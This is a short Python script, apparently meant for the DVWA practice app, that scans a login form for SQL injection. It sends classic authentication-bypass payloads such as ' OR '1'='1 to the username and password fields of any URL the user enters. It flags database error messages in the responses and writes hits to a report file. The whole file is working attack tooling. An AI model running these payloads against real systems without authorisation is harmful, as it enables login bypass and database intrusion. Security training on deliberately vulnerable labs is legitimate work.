import requests
import threading
import time
from urllib.parse import urljoin

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
]

ERROR_SIGNS = [
    "sql syntax",
    "mysql",
    "warning",
    "unclosed quotation",
    "quoted string"
]

RATE_LIMIT = 1
lock = threading.Lock()

def scan(url, param):
    for payload in PAYLOADS:
        data = {param: payload}

        try:
            r = requests.post(url, data=data, timeout=5)
            content = r.text.lower()

            for err in ERROR_SIGNS:
                if err in content:
                    with lock:
                        print(f"[!] Possible SQLi on {url} param={param}")
                        with open("report.txt","a") as f:
                            f.write(f"{url} | {param} | {payload}\n")

            time.sleep(RATE_LIMIT)

        except Exception:
            pass

def main():
    target = input("Target DVWA URL (login.php): ")
    params = ["username","password"]

    threads = []

    for p in params:
        t = threading.Thread(target=scan,args=(target,p))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("Scan complete.")

if __name__ == "__main__":
    main()
